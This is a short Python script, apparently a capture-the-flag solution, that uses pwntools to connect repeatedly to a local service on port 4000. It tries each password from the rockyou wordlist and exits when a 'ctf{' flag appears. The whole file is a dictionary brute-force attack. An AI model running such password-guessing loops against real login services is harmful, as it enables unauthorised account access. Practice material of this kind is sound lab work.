from pwn import  *

import sys

# Set the host and port
host = '127.0.0.1'
port = 4000
rockyou = 'rockyou.txt'

# Read and send each line from rockyou.txt
with open(rockyou, 'r', encoding='utf-8', errors='ignore') as f:
    check = False
    for line in f:
        # Initialize a connection
        conn = remote(host, port)

        # Send an empty value
        conn.sendline(b'')
        response = conn.recvline()
        print(response) # Decode the bytes to a string in Python 3

        password = line.strip()
        conn.sendline(password.encode()) # Encode the password string to bytes
        response = conn.recv()
        response = conn.recv()
        print(response)

        if "ctf{" in response.decode():
            sys.exit()
        conn.close()
